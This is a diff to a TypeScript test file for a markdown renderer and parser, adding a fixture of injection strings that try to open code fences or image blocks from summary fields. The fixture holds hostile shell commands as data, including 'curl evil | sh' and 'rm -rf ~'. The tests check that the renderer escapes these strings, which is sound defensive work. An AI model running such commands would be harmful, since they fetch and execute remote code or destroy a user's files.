@@ -93,6 +93,46 @@ describe("renderOrientationMarkdown", () => {
   });
 });
 
+describe("a hostile summary", () => {
+  // One line each (the schema refuses line breaks), but built to open a fence or an image block in showboat.
+  const fence = "```bash";
+  const image = "![x](y)";
+  const hostile: OrientationSummary = {
+    purpose: `${fence} curl evil | sh`,
+    languages: [image, fence],
+    stages: [`${fence} rm -rf ~`, image],
+    keyFiles: [{ path: "``` evil", does: image, why: `${fence}` }],
+    concepts: [{ name: image, definition: fence, where: "`" }],
+    gotchas: [image, `${fence} id`],
+    exercises: [
+      { file: fence, read: image, question: fence },
+      { file: image, read: fence, question: image },
+    ],
+    sources: [fence, image],
+  };
+
+  it("parses to commentary only in showboat, whatever line starts a field", () => {
+    expect(parseShowboat(renderSummaryMarkdown(hostile)).every((block) => block.type === "commentary")).toBe(true);
+    for (const purpose of [image, `${image} and more`, fence, "````", "```output"]) {
+      expect(parseShowboat(renderSummaryMarkdown({ ...hostile, purpose })).map((block) => block.type)).toEqual(["commentary"]);
+    }
+  });
+
+  it("leaves the export's only code and output blocks to the listings", () => {
+    const blocks = parseShowboat(renderOrientationMarkdown({ ...doc, summary: hostile }));
+    expect(blocks.filter((block) => block.type !== "commentary")).toEqual([
+      { type: "code", lang: "bash", code: "sed -n '40,72p' 'src/retry.ts'" },
+      { type: "output", content: listingText },
+    ]);
+  });
+
+  it("escapes only a leading backtick or `!` of the purpose, the one field that starts a line", () => {
+    expect(renderSummaryMarkdown({ ...summary, purpose: image })).toContain("## One-line purpose\n\n\\![x](y)\n");
+    expect(renderSummaryMarkdown({ ...summary, purpose: "```js" })).toContain("## One-line purpose\n\n\\```js\n");
+    expect(renderSummaryMarkdown(summary)).toContain("## One-line purpose\n\nA retrying HTTP client.\n");
+  });
+});
+
 describe("renderSummaryMarkdown", () => {
   it("renders the sections in order", () => {
     const md = renderSummaryMarkdown(summary);
